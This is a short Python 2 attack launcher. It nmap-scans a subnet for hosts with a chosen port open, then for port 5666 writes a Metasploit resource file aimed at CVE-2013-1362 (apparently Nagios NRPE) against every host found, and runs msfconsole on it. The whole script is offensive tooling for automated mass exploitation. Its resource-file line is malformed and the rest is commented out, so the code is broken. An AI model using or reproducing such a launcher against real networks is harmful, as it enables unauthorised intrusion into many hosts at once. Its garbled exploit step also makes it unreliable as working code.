#!/usr/bin/python

import nmap
import optparse
import os

def scan_nmap(subnet,target_port):
    target_ip_list=[]
    try:
        n_scan=nmap.PortScanner()
        print
        n_scan.scan(hosts=subnet,ports=target_port,arguments='--open -n')
        for target_ip in n_scan.all_hosts():
            target_ip_list.append(target_ip)
        if target_ip_list==[]:
            print 'No targets!!!'
            os._exit(0)
        return target_ip_list
    except:
        print 'sorry you scan false!!!'


def cve_2013_1362(ConfigFile,ip,port):
    ConfigFile.write('use'+ip+':'+port+'\n')
    #ConfigFile.write()
    #ConfigFile.write()
    #ConfigFile.write()

exploit_list={'5666':cve_2013_1362}

def main():
    parser=optparse.OptionParser()
    parser.add_option('-n','--net',action='store',type='string',dest='nets')
    parser.add_option('-m','--mod',action='store',type='string',dest='mods')
    parser.add_option('-p','--port',action='store',type='string',dest='port')
    (options,args)=parser.parse_args()
    subnets=options.nets
    mods=options.mods
    port=options.port
    ConfigFile = open('meta.rc', 'a')

    target_list=scan_nmap(subnets,port)
    for ip in target_list:
        for exploit in exploit_list:
            if  exploit == port:
                exploit_list[port](ConfigFile,ip,port)

    ConfigFile.close()

    os.system('msfconsole -r meta.rc')


if __name__ == '__main__':
    main()


